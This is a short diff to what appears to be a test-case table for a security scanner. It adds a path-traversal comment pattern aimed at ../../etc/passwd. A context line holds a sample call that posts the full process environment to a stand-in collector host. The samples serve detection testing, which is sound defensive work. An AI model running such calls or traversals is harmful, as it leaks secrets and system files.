@@ -32,6 +32,10 @@ CASES = {
         "positive": "requests.post('https://collector.example.com', data=os.environ)",
         "negative": "requests.get('https://example.com/status')",
     },
+    "comment_traversal_pattern": {
+        "positive": "/* Read config from ../../etc/passwd */",
+        "negative": "/* Read config from /etc/passwd */",
+    },
 }
 
 
